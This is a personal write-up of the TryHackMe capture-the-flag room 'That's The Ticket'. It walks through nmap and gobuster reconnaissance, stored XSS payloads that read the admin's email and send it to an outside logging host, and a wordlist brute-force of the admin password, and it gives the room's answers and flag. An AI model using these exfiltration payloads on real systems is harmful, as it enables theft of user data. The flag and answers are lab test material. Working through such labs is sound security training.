<p align="center">April 14, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{343}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/4fe1cc18-807a-4b4f-8db2-7dc5f7c421ba"></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{That´s The Ticket}}$$</h1>
<p align="center"><em>IT Support are going to have a bad day, can you get into the admin account?</em>.<br>
It is classified as a medium-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/thatstheticket">here</a>.</p>

<p align="center"> <img width="900px" src=""> </p>

<br>
<br>

<h2>Task 1 . Lab Information </h2>

<p>[  Start Machine  ]</p>

<p>IT Support is going to have a really bad day today, but don't think they're stupid! They have really strict firewalls!<br><br>

Using the IT support portal try and make your way into the admin account.<br><br>

Hint: Our HTTP & DNS Logging tool on http://XX.XX.XX.XXX may come in useful!</p>


<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 1.1. <em>What is IT Supports email address?</em><br><a id='1.1'></a>
>> <strong><code>adminaccount@itsupport.thm</code></strong><br>
<p></p>

<br>
<br>

<p>Used <code>nmap</code>.<br>
Discovered:<br>
  
-  2 ports open:  <code>22/ssh</code> and <code>80/http</code>.</p>


```bash
:~/Ticket# nmap -Pn -A -p- TargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Ticket Manager > Home

```

<br>

<p>Used <code>gobuster</code>.<br>
Discovered:<br>
  
-  2 directories:  <code>/login</code> and <code>/register</code>.</p>

<br>

```bash
:~/Ticket# gobuster dir -u http://TargetIP/ -w /usr/share/wordlists/dirb/common.txt -b 302,404 -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TargetIP/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   302,404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1549]
/register             (Status: 200) [Size: 1774]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
root@ip-10-10-13-8:~/Ticket# 


```


<br>

<p>Navigated to <code>http://TargetIP</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/953d831a-5ceb-4d25-8621-64e39fd3f7f9)

<br>

<p>Viewed source code.</p>

<br>

![image](https://github.com/user-attachments/assets/0370ef23-8e40-4459-96dc-65d69d5343f0)

<br>

<p>Clicked <code>Register</code>.</p>

<br>

<p>Created and account.</p>

<br>

![image](https://github.com/user-attachments/assets/00b79459-f230-4ee3-95a4-96450e19b196)

<br>

![image](https://github.com/user-attachments/assets/197ffce0-76c0-46be-a590-5a094b628929)



oi@abc.com

<br>

<p>Created a ticket.</p>


<p>Clicked <code>Back Dashboard</code> and my ticket is there.</p>

<br>

<p>Remembered that in the challenge introduction there was guidance about a tool.<br><br>Accessed it.<br><br> It is about <code>blind attacks</code>.</p>

<br>


![image](https://github.com/user-attachments/assets/dc382136-ed70-4f31-af45-9702ad81fc6f)


<br>


<p>Since it was provided this tool and we have a ticket system I will try some specific payload.</p>

</textarea><img src="http:eebc335a022c7f0d3b1c224d2b1da6c0.log.tryhackme.tech"><textarea>


<br>

![image](https://github.com/user-attachments/assets/16e8e20f-dd81-47bc-a2c1-2fa2573f5eb3)


<br>

![image](https://github.com/user-attachments/assets/61b72090-47de-40b1-afce-de5cb74ec0bf)

<br>

<p></textarea><script>var i=new Image;i.src="http://eebc335a022c7f0d3b1c224d2b1da6c0.log.tryhackme.tech/?"+document.getElementById('email').innerHTML;</script></p>

<br>

</textarea>
<script>
var email = document.getElementById("email").innerHTML;
email = email.replace('@', '@');
email = email.replace('.', '.');
fetch('http://'+ email + '.eebc335a022c7f0d3b1c224d2b1da6c0.log.tryhackme.tech');
</script>
<textarea>

![image](https://github.com/user-attachments/assets/4d4ffd1e-04bb-4117-9530-dd96b52773cc)


<br>


adminaccountaitsupportbthm

adminaccount a it support b thm
adminaccount@itsupport.thm and 3.251.105.234

<br>

<br>

> 1.2. <em>Admin users password</em><br><a id='1.2'></a>
>> <strong><code>123123</code></strong><br>
<p></p>

<br>


![image](https://github.com/user-attachments/assets/e4643bb8-b37e-44a5-9ff8-ac83e66b01ef)

<br>

<p>/usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-100.txt</p>

<br>

![image](https://github.com/user-attachments/assets/50874fdc-18e0-476f-af82-afa483aa1eaf)

<br>


<p>Clicked <code>Start Attack</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/e69ed3f6-2c99-46b9-a26c-df90c0208725)

<br>
<br>

> 1.3. <em>Flag inside Ticket 1</em><br><a id='1.3'></a>
>> <strong><code>THM{6804f45260135ec8418da2d906328473}</code></strong><br>
<p></p>

<br>


![image](https://github.com/user-attachments/assets/aeda3a55-0d23-4215-b564-6c5e5cd2b101)

<br>

![image](https://github.com/user-attachments/assets/e70e9663-237c-47e6-995f-f554b8dbc7a9)

<br>

![image](https://github.com/user-attachments/assets/0f60ef93-df76-4445-92dc-e37c9a7974a6)




![image](https://github.com/user-attachments/assets/f42739bb-6b61-463e-bcc9-1d5b9c87612e)


<br>

![image](https://github.com/user-attachments/assets/6655b577-9e81-42b7-915c-81cced0123ef)

<br>

<p>Remember the tool provided?  I clicked <code>Create Session</code>.<br><br><code>7ef262a90eea7ea25af17345f13927ab.log.tryhackme.tech</code></p>

<br>

![image](https://github.com/user-attachments/assets/cbba1834-6bb9-4106-94c6-c65173b9aa07)


<br>

<p></p>

<br>

![image](https://github.com/user-attachments/assets/5a1e9f05-7735-4f83-8ff8-d73d5902efc6)

<br>

![image](https://github.com/user-attachments/assets/07e4d955-3475-4bcf-be43-bc52a621f67a)

<br>

![image](https://github.com/user-attachments/assets/1d10e502-7aef-47a2-84fe-d53171bebc2c)

<br>

![image](https://github.com/user-attachments/assets/b7385fc7-72d4-4438-aa97-9bea999e5fb9)

<br>3.248.180.240 and 99.80.88.107, 34.245.205.141, 99.80.88.112, 3.248.180.146

<br>

```bash

</textarea><script>
var email = document.getElementById("email").innerText;
email = email.replace("@", "0")
email = email.replace(".", "x")
document.location = "http://" + email + ".7ef262a90eea7ea25af17345f13927ab.log.tryhackme.tech";

```





